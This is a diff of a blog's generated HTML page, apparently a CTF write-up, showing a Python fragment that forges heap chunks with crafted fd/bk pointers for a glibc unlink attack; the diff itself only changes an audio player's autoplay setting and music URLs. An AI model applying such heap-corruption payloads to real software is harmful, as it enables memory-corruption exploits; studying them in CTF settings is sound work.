@@ -68,15 +68,15 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  #free_chunk.pre_chunk</span><br><span class="line">context=&quot;&quot;  </span><br><span class="line">context+=p32(0x0)#free_chunk.pre_chunk.pre_chunk_size=0</span><br><span class="line">context+=p32(0x81)  #free_chunk.pre_chunk=0x80 &amp;&amp; free_chunk.pre_chunk.pre_chunk is in use</span><br><span class="line">context+=p32(heap_addr+sub_heap+0x70-0x4-0xc)#fd = ptr addr which stores free_chunk_addr -0xc</span><br><span class="line">context+=p32(heap_addr+sub_heap+0x70-0x4-0x8)#bk = ptr addr which stores free_chunk_addr -0x8</span><br><span class="line">context+=&apos;a&apos;*(0x80-0x10) #padding </span><br><span class="line"></span><br><span class="line">#free_chunk</span><br><span class="line">context+=p32(0x80)  #free_chunk.pre_chunk_size=0x80</span><br><span class="line">context+=p32(0x88)  #free_chunk_size=0x88 &amp;&amp; free_chunk.pre_chunk is free</span><br><span class="line">context+=&apos;m&apos;*0x80 #padding</span><br><span class="line"></span><br><span class="line">free_chunk.next_chunk</span><br><span class="line">context+=p32(0x88) #free_chunk.next_chunk.pre_chunk_size = free_chunk_size</span><br><span class="line">context+=p32(0x79) #free_chunk.next_chunk_size=0x79 &amp;&amp; free_chunk is in use</span><br><span class="line">#ATTENTION 0x79 matters the free_chunk.next_chunk is use or not,so you have to calc the size to enture the free_chunk.next_chunk.next_chunk.flag is 1!!!</span><br><span class="line">oh,in addition, this_chunk.next_chunk is located by the chunk _size:)</span><br><span class="line">context+=p32(0)</span><br><span class="line">context+=p32(0)</span><br></pre></td></tr></table></figure>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
             </audio>
             
                 <ul id="audio-list" style="display:none">
                     
-                        <li title='0' data-url='http://link.hhtjim.com/163/5146554.mp3'></li>
+                        <li title='0' data-url='http://m10.music.126.net/20180916113418/9aab6f211d7d542c238ad8e856acbf17/ymusic/d362/a82b/bb7a/325193739e451e3017606bae8292b76d.mp3'></li>
                     
-                        <li title='1' data-url='http://link.hhtjim.com/qq/001faIUs4M2zna.mp3'></li>
+                        <li title='1' data-url='http://m10.music.126.net/20180916113418/9aab6f211d7d542c238ad8e856acbf17/ymusic/d362/a82b/bb7a/325193739e451e3017606bae8292b76d.mp3'></li>
                     
                 </ul>
             
